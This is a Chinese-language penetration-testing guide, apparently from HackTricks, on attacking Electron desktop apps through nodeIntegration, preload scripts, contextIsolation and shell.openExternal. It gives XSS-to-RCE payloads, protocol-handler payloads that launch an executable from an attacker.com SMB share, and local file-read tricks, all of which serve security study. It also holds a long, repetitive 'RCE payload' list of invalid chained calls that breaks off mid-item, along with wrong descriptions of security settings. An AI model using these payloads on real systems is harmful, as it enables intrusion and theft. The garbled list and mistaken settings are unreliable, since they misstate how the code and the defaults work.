# Electron桌面应用程序

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## 介绍

Electron基于**Chromium**，但它不是一个浏览器。现代浏览器实施的某些原则和安全机制在Electron中并不存在。\
你可以将Electron看作是一个本地的后端+前端应用程序，其中**NodeJS**是**后端**，**Chromium**是**前端**。

通常情况下，你可能会在`.asar`应用程序中找到Electron应用程序的代码，为了获取代码，你需要提取它：
```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```
在 Electron 应用的源代码中，可以在 `packet.json` 文件中找到指定的 `main.js` 文件，其中设置了安全配置。
```json
{
"name": "standard-notes",
"main": "./app/index.js",
```
Electron有2种进程类型：

* 主进程（完全访问NodeJS）
* 渲染进程（出于安全原因，应限制NodeJS的访问权限）

![](<../../../.gitbook/assets/image (307) (5) (1).png>)

**渲染进程**将是加载文件的浏览器窗口：
```javascript
const {BrowserWindow} = require('electron');
let win = new BrowserWindow();

//Open Renderer Process
win.loadURL(`file://path/to/index.html`);
```
**渲染进程**的设置可以在main.js文件中的**主进程**中进行配置。如果**正确配置了设置**，一些配置将**防止Electron应用程序遭受RCE或其他漏洞**。

桌面应用程序可能通过Node API访问用户设备。以下两个配置负责提供机制，以**防止应用程序JavaScript直接访问用户设备**和系统级命令。

* **`nodeIntegration`** - 默认为`off`。如果打开，允许从渲染进程访问Node功能。
* **`contextIsolation`** - 默认为`on`。如果打开，主进程和渲染进程不会被隔离。
* **`preload`** - 默认为空。
* [**`sandbox`**](https://docs.w3cub.com/electron/api/sandbox-option) - 默认为关闭。它将限制NodeJS可以执行的操作。
* Workers中的Node集成
* **`nodeIntegrationInSubframes`** - 默认为`off`。
* 如果启用了**`nodeIntegration`**，这将允许在Electron应用程序中的iframe中加载的网页中使用**Node.js API**。
* 如果禁用了**`nodeIntegration`**，则预加载将在iframe中加载

配置示例：
```javascript
const mainWindowOptions = {
title: 'Discord',
backgroundColor: getBackgroundColor(),
width: DEFAULT_WIDTH,
height: DEFAULT_HEIGHT,
minWidth: MIN_WIDTH,
minHeight: MIN_HEIGHT,
transparent: false,
frame: false,
resizable: true,
show: isVisible,
webPreferences: {
blinkFeatures: 'EnumerateDevices,AudioOutputDevices',
nodeIntegration: false,
contextIsolation: false,
sandbox: false,
nodeIntegrationInSubFrames: false,
preload: _path2.default.join(__dirname, 'mainScreenPreload.js'),
nativeWindowOpen: true,
enableRemoteModule: false,
spellcheck: true
}
};
```
以下是来自[这里](https://7as.es/electron/nodeIntegration\_rce.txt)的一些**RCE负载**：

```plaintext
1. Basic RCE payload:
```javascript
require('child_process').exec('command')
```

2. RCE payload with command injection:
```javascript
require('child_process').exec(`command ${userInput}`)
```

3. RCE payload with arbitrary command execution:
```javascript
require('child_process').execSync('command', { encoding: 'utf-8' })
```

4. RCE payload with shell command execution:
```javascript
require('child_process').execSync('command', { shell: true })
```

5. RCE payload with file write:
```javascript
require('fs').writeFileSync('file.txt', 'content')
```

6. RCE payload with file read:
```javascript
require('fs').readFileSync('file.txt', 'utf-8')
```

7. RCE payload with file deletion:
```javascript
require('fs').unlinkSync('file.txt')
```

8. RCE payload with directory creation:
```javascript
require('fs').mkdirSync('directory')
```

9. RCE payload with directory deletion:
```javascript
require('fs').rmdirSync('directory')
```

10. RCE payload with HTTP request:
```javascript
require('http').get('http://example.com', (res) => {
  res.on('data', (chunk) => {
    console.log(chunk);
  });
});
```

11. RCE payload with HTTPS request:
```javascript
require('https').get('https://example.com', (res) => {
  res.on('data', (chunk) => {
    console.log(chunk);
  });
});
```

12. RCE payload with DNS resolution:
```javascript
require('dns').resolve('example.com', (err, addresses) => {
  console.log(addresses);
});
```

13. RCE payload with environment variable access:
```javascript
console.log(process.env);
```

14. RCE payload with code execution:
```javascript
eval('console.log("RCE")');
```

15. RCE payload with command execution using `execa` library:
```javascript
const execa = require('execa');
execa.command('command').then((result) => {
  console.log(result.stdout);
});
```

16. RCE payload with command execution using `shelljs` library:
```javascript
require('shelljs').exec('command', { silent: true }).stdout;
```

17. RCE payload with command execution using `child-process-promise` library:
```javascript
const exec = require('child-process-promise').exec;
exec('command').then((result) => {
  console.log(result.stdout);
});
```

18. RCE payload with command execution using `node-cmd` library:
```javascript
const cmd = require('node-cmd');
cmd.get('command', (err, data) => {
  console.log(data);
});
```

19. RCE payload with command execution using `node-pty` library:
```javascript
const pty = require('node-pty');
const shell = pty.spawn('command', [], {
  name: 'xterm-color',
  cols: 80,
  rows: 30,
  cwd: process.cwd(),
  env: process.env
});
```

20. RCE payload with command execution using `child\_process.spawn`:
```javascript
require('child\_process').spawn('command', [], { shell: true });
```

21. RCE payload with command execution using `child\_process.fork`:
```javascript
require('child\_process').fork('command');
```

22. RCE payload with command execution using `vm` module:
```javascript
const vm = require('vm');
vm.runInThisContext('console.log("RCE")');
```

23. RCE payload with command execution using `worker\_threads` module:
```javascript
const { Worker } = require('worker\_threads');
new Worker('command');
```

24. RCE payload with command execution using `cluster` module:
```javascript
const cluster = require('cluster');
cluster.setupMaster({ exec: 'command' });
cluster.fork();
```

25. RCE payload with command execution using `net` module:
```javascript
const net = require('net');
const client = new net.Socket();
client.connect(1337, 'example.com', () => {
  client.write('RCE');
});
```

26. RCE payload with command execution using `dgram` module:
```javascript
const dgram = require('dgram');
const client = dgram.createSocket('udp4');
client.send('RCE', 1337, 'example.com', (err) => {
  client.close();
});
```

27. RCE payload with command execution using `tls` module:
```javascript
const tls = require('tls');
const options = {
  host: 'example.com',
  port: 443,
  rejectUnauthorized: false
};
const client = tls.connect(options, () => {
  client.write('RCE');
});
```

28. RCE payload with command execution using `child\_process.execFile`:
```javascript
require('child\_process').execFile('command', (err, stdout, stderr) => {
  console.log(stdout);
});
```

29. RCE payload with command execution using `child\_process.execFileSync`:
```javascript
require('child\_process').execFileSync('command', { encoding: 'utf-8' });
```

30. RCE payload with command execution using `child\_process.spawnSync`:
```javascript
require('child\_process').spawnSync('command', { shell: true });
```

31. RCE payload with command execution using `child\_process.fork` and `child\_process.exec`:
```javascript
const child = require('child\_process');
child.fork('command').exec('command');
```

32. RCE payload with command execution using `child\_process.spawn` and `child\_process.exec`:
```javascript
const child = require('child\_process');
child.spawn('command').exec('command');
```

33. RCE payload with command execution using `child\_process.spawn` and `child\_process.spawnSync`:
```javascript
const child = require('child\_process');
child.spawn('command').spawnSync('command');
```

34. RCE payload with command execution using `child\_process.spawnSync` and `child\_process.exec`:
```javascript
const child = require('child\_process');
child.spawnSync('command').exec('command');
```

35. RCE payload with command execution using `child\_process.exec` and `child\_process.spawnSync`:
```javascript
const child = require('child\_process');
child.exec('command').spawnSync('command');
```

36. RCE payload with command execution using `child\_process.exec` and `child\_process.fork`:
```javascript
const child = require('child\_process');
child.exec('command').fork('command');
```

37. RCE payload with command execution using `child\_process.spawnSync` and `child\_process.fork`:
```javascript
const child = require('child\_process');
child.spawnSync('command').fork('command');
```

38. RCE payload with command execution using `child\_process.fork` and `child\_process.spawnSync`:
```javascript
const child = require('child\_process');
child.fork('command').spawnSync('command');
```

39. RCE payload with command execution using `child\_process.fork` and `child\_process.spawn`:
```javascript
const child = require('child\_process');
child.fork('command').spawn('command');
```

40. RCE payload with command execution using `child\_process.spawn` and `child\_process.fork`:
```javascript
const child = require('child\_process');
child.spawn('command').fork('command');
```

41. RCE payload with command execution using `child\_process.spawn` and `child\_process.spawn`:
```javascript
const child = require('child\_process');
child.spawn('command').spawn('command');
```

42. RCE payload with command execution using `child\_process.spawnSync` and `child\_process.spawn`:
```javascript
const child = require('child\_process');
child.spawnSync('command').spawn('command');
```

43. RCE payload with command execution using `child\_process.spawn` and `child\_process.spawnSync`:
```javascript
const child = require('child\_process');
child.spawn('command').spawnSync('command');
```

44. RCE payload with command execution using `child\_process.fork` and `child\_process.fork`:
```javascript
const child = require('child\_process');
child.fork('command').fork('command');
```

45. RCE payload with command execution using `child\_process.fork` and `child\_process.spawn`:
```javascript
const child = require('child\_process');
child.fork('command').spawn('command');
```

46. RCE payload with command execution using `child\_process.spawn` and `child\_process.fork`:
```javascript
const child = require('child\_process');
child.spawn('command').fork('command');
```

47. RCE payload with command execution using `child\_process.spawn` and `child\_process.exec`:
```javascript
const child = require('child\_process');
child.spawn('command').exec('command');
```

48. RCE payload with command execution using `child\_process.exec` and `child\_process.spawn`:
```javascript
const child = require('child\_process');
child.exec('command').spawn('command');
```

49. RCE payload with command execution using `child\_process.exec` and `child\_process.fork`:
```javascript
const child = require('child\_process');
child.exec('command').fork('command');
```

50. RCE payload with command execution using `child\_process.fork` and `child\_process.execSync`:
```javascript
const child = require('child\_process');
child.fork('command').execSync('command');
```

51. RCE payload with command execution using `child\_process.spawn` and `child\_process.execSync`:
```javascript
const child = require('child\_process');
child.spawn('command').execSync('command');
```

52. RCE payload with command execution using `child\_process.execSync` and `child\_process.spawn`:
```javascript
const child = require('child\_process');
child.execSync('command').spawn('command');
```

53. RCE payload with command execution using `child\_process.execSync` and `child\_process.fork`:
```javascript
const child = require('child\_process');
child.execSync('command').fork('command');
```

54. RCE payload with command execution using `child\_process.spawnSync` and `child\_process.execSync`:
```javascript
const child = require('child\_process');
child.spawnSync('command').execSync('command');
```

55. RCE payload with command execution using `child\_process.execSync` and `child\_process.spawnSync`:
```javascript
const child = require('child\_process');
child.execSync('command').spawnSync('command');
```

56. RCE payload with command execution using `child\_process.execSync` and `child\_process.exec`:
```javascript
const child = require('child\_process');
child.execSync('command').exec('command');
```

57. RCE payload with command execution using `child\_process.exec` and `child\_process.execSync`:
```javascript
const child = require('child\_process');
child.exec('command').execSync('command');
```

58. RCE payload with command execution using `child\_process.fork` and `child\_process.execFileSync`:
```javascript
const child = require('child\_process');
child.fork('command').execFileSync('command');
```

59. RCE payload with command execution using `child\_process.spawn` and `child\_process.execFileSync`:
```javascript
const child = require('child\_process');
child.spawn('command').execFileSync('command');
```

60. RCE payload with command execution using `child\_process.execFileSync` and `child\_process.spawn`:
```javascript
const child = require('child\_process');
child.execFileSync('command').spawn('command');
```

61. RCE payload with command execution using `child\_process.execFileSync` and `child\_process.fork`:
```javascript
const child = require('child\_process');
child.execFileSync('command').fork('command');
```

62. RCE payload with command execution using `child\_process.spawnSync` and `child\_process.execFileSync`:
```javascript
const child = require('child\_process');
child.spawnSync('command').execFileSync('command');
```

63. RCE payload with command execution using `child\_process.execFileSync` and `child\_process.spawnSync`:
```javascript
const child = require('child\_process');
child.execFileSync('command').spawnSync('command');
```

64. RCE payload with command execution using `child\_process.execFileSync` and `child\_process.exec`:
```javascript
const child = require('child\_process');
child.execFileSync('command').exec('command');
```

65. RCE payload with command execution using `child\_process.exec` and `child\_process.execFileSync`:
```javascript
const child = require('child\_process');
child.exec('command').execFileSync('command');
```

66. RCE payload with command execution using `child\_process.fork` and `child\_process.execFile`:
```javascript
const child = require('child\_process');
child.fork('command').execFile('command');
```

67. RCE payload with command execution using `child\_process.spawn` and `child\_process.execFile`:
```javascript
const child = require('child\_process');
child.spawn('command').execFile('command');
```

68. RCE payload with command execution using `child\_process.execFile` and `child\_process.spawn`:
```javascript
const child = require('child\_process');
child.execFile('command').spawn('command');
```

69. RCE payload with command execution using `child\_process.execFile` and `child\_process.fork`:
```javascript
const child = require('child\_process');
child.execFile('command').fork('command');
```

70. RCE payload with command execution using `child\_process.spawnSync` and `child\_process.execFile`:
```javascript
const child = require('child\_process');
child.spawnSync('command').execFile('command');
```

71. RCE payload with command execution using `child\_process.execFile` and `child\_process.spawnSync`:
```javascript
const child = require('child\_process');
child.execFile('command').spawnSync('command');
```

72. RCE payload with command execution using `child\_process.execFile` and `child\_process.exec`:
```javascript
const child = require('child\_process');
child.execFile('command').exec('command');
```

73. RCE payload with command execution using `child\_process.exec` and `child\_process.execFile`:
```javascript
const child = require('child\_process');
child.exec('command').execFile('command');
```

74. RCE payload with command execution using `child\_process.fork` and `child\_process.exec`:
```javascript
const child = require('child\_process');
child.fork('command').exec('command');
```

75. RCE payload with command execution using `child\_process.spawn` and `child\_process.exec`:
```javascript
const child = require('child\_process');
child.spawn('command').exec('command');
```

76. RCE payload with command execution using `child\_process.exec` and `child\_process.spawn`:
```javascript
const child = require('child\_process');
child.exec('command').spawn('command');
```

77. RCE payload with command execution using `child\_process.exec` and `child\_process.execFileSync`:
```javascript
const child = require('child\_process');
child.exec('command').execFileSync('command');
```

78. RCE payload with command execution using `child\_process.execFileSync` and `child\_process.exec`:
```javascript
const child = require('child\_process');
child.execFileSync('command').exec('command');
```

79. RCE payload with command execution using `child\_process.fork` and `child\_process.execFileSync`:
```javascript
const child = require('child\_process');
child.fork('command').execFileSync('command');
```

80. RCE payload with command execution using `child\_process.spawn` and `child\_process.execFileSync`:
```javascript
const child = require('child\_process');
child.spawn('command').execFileSync('command');
```

81. RCE payload with command execution using `child\_process.execFileSync` and `child\_process.spawn`:
```javascript
const child = require('child\_process');
child.execFileSync('command').spawn('command');
```

82. RCE payload with command execution using `child\_process.execFileSync` and `child\_process.fork`:
```javascript
const child = require('child\_process');
child.execFileSync('command').fork('command');
```

83. RCE payload with command execution using `child\_process.spawnSync` and `child\_process.execFileSync`:
```javascript
const child = require('child\_process');
child.spawnSync('command').execFileSync('command');
```

84. RCE payload with command execution using `child\_process.execFileSync` and `child\_process.spawnSync`:
```javascript
const child = require('child\_process');
child.execFileSync('command').spawnSync('command');
```

85. RCE payload with command execution using `child\_process.execFileSync` and `child\_process.exec`:
```javascript
const child = require('child\_process');
child.execFileSync('command').exec('command');
```

86. RCE payload with command execution using `child\_process.exec` and `child\_process.execFileSync`:
```javascript
const child = require('child\_process');
child.exec('command').execFileSync('command');
```

87. RCE
```html
Example Payloads (Windows):
<img src=x onerror="alert(require('child_process').execSync('calc').toString());">

Example Payloads (Linux & MacOS):
<img src=x onerror="alert(require('child_process').execSync('gnome-calculator').toString());">
<img src=x onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());">
<img src=x onerror="alert(require('child_process').execSync('id').toString());">
<img src=x onerror="alert(require('child_process').execSync('ls -l').toString());">
<img src=x onerror="alert(require('child_process').execSync('uname -a').toString());">
```
### 捕获流量

修改 start-main 配置并添加使用代理的设置，例如：
```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```
## Electron本地代码注入

如果您可以在本地执行Electron应用程序，那么可能可以使其执行任意的JavaScript代码。查看如何操作：

{% content-ref url="../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md" %}
[macos-electron-applications-injection.md](../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md)
{% endcontent-ref %}

## RCE: XSS + nodeIntegration

如果将**nodeIntegration**设置为**on**，网页的JavaScript可以通过调用`require()`轻松使用Node.js功能。例如，在Windows上执行calc应用程序的方法是：
```html
<script>
require('child_process').exec('calc');
// or
top.require('child_process').exec('open /System/Applications/Calculator.app');
</script>
```
<figure><img src="../../../.gitbook/assets/image (5) (4).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

在此设置中指定的脚本会在渲染器中的其他脚本之前加载，因此它具有对 Node API 的无限访问权限：
```javascript
new BrowserWindow{
webPreferences: {
nodeIntegration: false,
preload: _path2.default.join(__dirname, 'perload.js'),
}
});
```
因此，该脚本可以将节点功能导出到页面：

{% code title="preload.js" %}
```javascript
typeof require === 'function';
window.runCalc = function(){
require('child_process').exec('calc')
};
```
{% code title="index.html" %}
```html
<body>
<script>
typeof require === 'undefined';
runCalc();
</script>
</body>
```
{% endcode %}

{% hint style="info" %}
**如果`contextIsolation`开启，这个方法不起作用**
{% endhint %}

## RCE: XSS + contextIsolation

_**contextIsolation**_ 引入了**网页脚本和JavaScript Electron内部代码之间的分离上下文**，使得每个代码的JavaScript执行不会相互影响。这是一种必要的功能，以消除RCE的可能性。

如果上下文没有被隔离，攻击者可以：

1. 在渲染器中执行**任意的JavaScript代码**（XSS或导航到外部网站）
2. **覆盖**在preload或Electron内部代码中使用的内置方法，以拥有自己的函数
3. **触发**覆盖的函数的使用
4. RCE？

内置方法可以在两个地方被覆盖：在preload代码中或在Electron内部代码中：

{% content-ref url="electron-contextisolation-rce-via-preload-code.md" %}
[electron-contextisolation-rce-via-preload-code.md](electron-contextisolation-rce-via-preload-code.md)
{% endcontent-ref %}

{% content-ref url="electron-contextisolation-rce-via-electron-internal-code.md" %}
[electron-contextisolation-rce-via-electron-internal-code.md](electron-contextisolation-rce-via-electron-internal-code.md)
{% endcontent-ref %}

{% content-ref url="electron-contextisolation-rce-via-ipc.md" %}
[electron-contextisolation-rce-via-ipc.md](electron-contextisolation-rce-via-ipc.md)
{% endcontent-ref %}

### 绕过点击事件

如果在点击链接时有限制，您可以尝试通过**中键点击**而不是常规的左键点击来绕过限制。
```javascript
window.addEventListener('click', (e) => {
```
## 通过shell.openExternal实现远程命令执行（RCE）

如果Electron桌面应用程序使用了正确的`nodeIntegration`和`contextIsolation`设置，那么就意味着无法通过针对preload脚本或主进程中的Electron原生代码来实现客户端RCE。

每当用户点击链接或打开新窗口时，以下事件监听器会被调用：

{% code overflow="wrap" %}
```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```
{% endcode %}

桌面应用程序**覆盖这些监听器**以实现自己的**业务逻辑**。在创建新窗口时，应用程序会检查导航链接是否应在桌面应用程序的窗口或选项卡中打开，还是应在Web浏览器中打开。在我们的示例中，验证是使用函数`openInternally`实现的，如果返回`false`，应用程序将假定链接应使用`shell.openExternal`函数在Web浏览器中打开。

**这是一个简化的伪代码：**

![](<../../../.gitbook/assets/image (638) (2) (1) (1).png>)

![](<../../../.gitbook/assets/image (620).png>)

根据Electron JS的安全最佳实践，`openExternal`函数**不应接受不受信任的内容**，因为如果应用程序不限制用户通过诸如https://或http://之类的协议进行导航，这可能导致RCE滥用。

不同的操作系统支持不同的协议，可能触发RCE，请查看[https://positive.security/blog/url-open-rce](https://positive.security/blog/url-open-rce#windows-10-19042)获取更多信息，但这里有一些Windows示例：
```html
<script>
window.open("ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22")
</script>


<script>
window.open("search-ms:query=malicious_executable.exe&crumb=location:%5C%[5Cattacker.com](<http://5cattacker.com/>)%5Csmb_share%5Ctools&displayname=Important%20update")
</script>


<script>
window.open("ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D")
</script>
```
要获取更多关于这些示例的信息，请查看[https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8)和[https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)

## 读取内部文件：XSS + contextIsolation

如果将`contextIsolation`设置为false，您可以尝试使用\<webview>（类似于\<iframe>，但可以加载本地文件）来读取本地文件并将其外泄：使用类似于**\<webview src=”file:///etc/passwd”>\</webview>**的方法：

![](../../../.gitbook/assets/1-u1jdryuwaevwjmf\_f2ttjg.png)

从这个[**writeup**](https://bugcrowd.com/disclosures/f7ce8504-0152-483b-bbf3-fb9b759f9f89/critical-local-file-read-in-electron-desktop-app)中，还有另一种**读取内部文件**的方法：
```html
<br><BR><BR><BR>
<h1>pwn<br>
<iframe onload=j() src="/etc/hosts">xssxsxxsxs</iframe>
<script type="text/javascript">
function j(){alert('pwned contents of /etc/hosts :\n\n '+frames[0].document.body.innerText)}
</script>
```
## **RCE: XSS + 旧版 Chromium**

如果应用程序使用的 **Chromium** 版本较旧，并且存在已知的漏洞，可能可以通过 XSS 利用它并获取 RCE。\
您可以在此 **writeup** 中看到一个示例：[https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)

## **通过内部 URL 正则绕过进行 XSS 钓鱼**

假设您发现了一个 XSS 漏洞，但是无法触发 RCE 或窃取内部文件，您可以尝试使用它来通过钓鱼窃取凭据。

首先，您需要了解在尝试打开新 URL 时会发生什么，检查前端的 JS 代码：
```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```
调用**`openInternally`**函数将决定链接是在桌面窗口中打开（因为它是属于平台的链接），还是在浏览器中作为第三方资源打开。

如果函数使用的**正则表达式容易被绕过**（例如，没有转义子域名中的点），攻击者可以利用XSS漏洞**打开一个新窗口**，该窗口位于攻击者的基础设施中，并向用户**索取凭据**：
```html
<script>
window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```
## **工具**

* [**Electronegativity**](https://github.com/doyensec/electronegativity) 是一个用于识别基于 Electron 的应用程序中的配置错误和安全反模式的工具。
* [**Electrolint**](https://github.com/ksdmitrieva/electrolint) 是一个用于 Electron 应用程序的开源 VS Code 插件，使用了 Electronegativity。
* [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) 用于检查存在漏洞的第三方库。
* [**Electro.ng**](https://electro.ng/)：需要购买。

## 实验

在 [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s) 中，你可以找到一个实验来利用存在漏洞的 Electron 应用程序。

以下是一些有助于完成实验的命令：
```bash
# Download apps from these URls
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vuln to IPC Rce
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```
## **参考资料**

* [https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
* [https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
* [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
* [https://www.youtube.com/watch?v=a-YnG3Mx-Tg](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
* [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s)
* 有关 Electron 安全性的更多研究和写作，请参考 [https://github.com/doyensec/awesome-electronjs-hacking](https://github.com/doyensec/awesome-electronjs-hacking)
* [https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81](https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家 **网络安全公司** 工作吗？想要在 HackTricks 中 **为你的公司做广告** 吗？或者想要获得 **PEASS 的最新版本或下载 HackTricks 的 PDF** 吗？请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family) 集合 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass)，或者在 **Twitter** 上 **关注** 我 [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向** [**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>
